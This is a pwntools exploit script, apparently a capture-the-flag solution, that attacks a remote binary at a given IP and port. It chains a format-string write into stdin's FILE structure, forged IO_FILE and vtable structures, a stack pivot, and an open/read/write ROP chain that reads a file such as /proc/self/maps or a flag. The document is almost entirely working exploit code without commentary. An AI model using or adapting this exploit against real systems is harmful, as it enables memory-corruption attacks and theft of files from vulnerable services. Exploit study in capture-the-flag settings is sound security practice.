from pwn import *
from IO_FILE import *

###Addr
stdin_struct = 0x6ed540
stdin_writebase = stdin_struct+0x20
stdin_bufbase = stdin_struct+0x38
stdin_mode = stdin_struct+0xc0
stdin_vtable = stdin_struct+0xd8
stdin_widedata_struct = 0x6ed620
IO_new_file_underflow = 0x41b800
IO_file_read = 0x41c770

###ROPgadget
pop_rdi = 0x401f0a
pop_rsi = 0x4014a4
pop_rax_rdx_rbx = 0x482286
syscall = 0x471115
add_rsp_0x148 = 0x47d453
trampoline = 0x481168
'''
  481168:	48 89 dc             	mov    rsp,rbx
  48116b:	48 8b 1c 24          	mov    rbx,QWORD PTR [rsp]
  48116f:	48 83 c4 30          	add    rsp,0x30
  481173:	f2 c3                	bnd ret 
'''
###Exploit
#r = process('./pwn')
r = remote('110.80.136.44',10181)

payload = '%20$hhn'+\
          '%'+str(0x40)+'c%21$hhn'+\
          ' %22$n'+\
          '%23$n'+\
          '%'+str(0x6e-0x41)+'c%24$n'+\
          '%'+str(0xb800-0x6e)+'c%25$hn'+\
          '%'+str(0xc770-0xb800)+'c%26$hn'+\
          '%'+str(0xd5f0-0xc770)+'c%27$hn'+\
          '%28$n'
payload = payload.ljust(0x60,'\x00').encode()
payload+= p64(stdin_struct)+\
          p64(stdin_bufbase)+\
          p64(stdin_widedata_struct+0x28+2)+\
          p64(stdin_widedata_struct+0x40+2)+\
          p64(stdin_vtable+2)+\
          p64(stdin_widedata_struct+0x28)+\
          p64(stdin_widedata_struct+0x40)+\
          p64(stdin_vtable)+\
          p64(stdin_mode+2)
r.sendline(payload)
#r.sendlineafter('back.\n',payload)

IO_file = IO_FILE_plus(arch=64)
stream = IO_file.construct()
stream1 = IO_file.construct(flags = 0xfbad2800,
                            read_ptr = stdin_struct, read_end = stdin_struct-0x84,
                            buf_base = stdin_struct, buf_end = stdin_struct+0x300,
                            chain = stdin_struct,
                            fileno = 0)
r.send(stream1[:0x84])

stream2 = IO_file.construct(flags = 0xfbad2800,
                            read_ptr = stdin_struct, read_end = stdin_struct-0x84,
                            write_end = add_rsp_0x148,
                            buf_base = stdin_struct, buf_end = stdin_struct+0x200,
                            chain = stdin_struct,
                            fileno = 0,
                            lock = stdin_struct-0x20,
                            mode = 0xffffffff,
                            vtable = stdin_widedata_struct-0x30)
IO_jumps = IO_jump_t(arch=64)
vtable = IO_jumps.construct(setbuf=trampoline)

ROPchain = p64(pop_rdi)+p64(stdin_struct+0x180+0xd8)+\
           p64(pop_rsi)+p64(0)+\
           p64(pop_rax_rdx_rbx)+p64(2)+p64(0)+p64(0)+\
           p64(syscall)+\
           p64(pop_rdi)+p64(3)+\
           p64(pop_rsi)+p64(stdin_struct)+\
           p64(pop_rax_rdx_rbx)+p64(0)+p64(0x100)+p64(0)+\
           p64(syscall)+\
           p64(pop_rdi)+p64(1)+\
           p64(pop_rsi)+p64(stdin_struct)+\
           p64(pop_rax_rdx_rbx)+p64(1)+p64(0x100)+p64(0)+\
           p64(syscall)
#argument = b'/home/pwn/flag\x00'
argument = b'/proc/self/maps\x00'

payload = (stream2+vtable[0x30:]).ljust(0x180,b'\x00')+ROPchain+argument

ui.pause()
r.send(payload)
r.interactive()

#0x
